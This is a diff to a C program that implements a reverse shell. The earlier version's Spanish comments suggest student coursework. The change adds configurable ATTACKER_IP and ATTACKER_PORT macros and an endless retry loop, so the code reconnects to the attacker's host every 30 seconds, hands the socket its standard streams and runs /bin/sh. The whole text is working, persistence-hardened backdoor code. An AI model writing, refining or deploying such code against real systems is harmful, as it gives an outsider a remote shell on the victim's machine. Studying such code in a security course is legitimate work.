@@ -6,30 +6,41 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
+#ifndef ATTACKER_IP
+#define ATTACKER_IP "192.168.1.50"
+#endif
+#ifndef ATTACKER_PORT
+#define ATTACKER_PORT 4444
+#endif
+#ifndef RETRY_DELAY
+#define RETRY_DELAY 30
+#endif
+
 int main(void) {
-    int sockt;
-    int port = 4444; // Puerto definido por el estudiante 
-    struct sockaddr_in revsockaddr;
+    struct sockaddr_in revsockaddr = {
+        .sin_family = AF_INET,
+        .sin_port   = htons(ATTACKER_PORT),
+        .sin_addr.s_addr = inet_addr(ATTACKER_IP),
+    };
 
-    // 1. Creación del socket TCP 
-    sockt = socket(AF_INET, SOCK_STREAM, 0);
+    while (1) {
+        int sockt = socket(AF_INET, SOCK_STREAM, 0);
+        if (sockt < 0) { sleep(RETRY_DELAY); continue; }
 
-    revsockaddr.sin_family = AF_INET;
-    revsockaddr.sin_port = htons(port);
-    revsockaddr.sin_addr.s_addr = inet_addr("192.168.1.204"); // IP del Atacante
+        if (connect(sockt, (struct sockaddr *)&revsockaddr, sizeof(revsockaddr)) < 0) {
+            close(sockt);
+            sleep(RETRY_DELAY);
+            continue;
+        }
 
-    // 2. Conexión saliente hacia la IP definida 
-    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
+        dup2(sockt, 0);
+        dup2(sockt, 1);
+        dup2(sockt, 2);
+        close(sockt);
 
-    // 3. Duplicación de descriptores de archivo (Reverse Shell) 
-    // Redirige stdin, stdout y stderr al socket
-    dup2(sockt, 0);
-    dup2(sockt, 1);
-    dup2(sockt, 2);
+        char *argv[] = { "/bin/sh", NULL };
+        execve("/bin/sh", argv, NULL);
 
-    // 4. Ejecución del shell en la víctima 
-    char* const argv[] = { const_cast<char*>("/bin/sh"), NULL};
-    execve("/bin/sh", argv, NULL);
-
-    return 0;
+        sleep(RETRY_DELAY);
+    }
 }
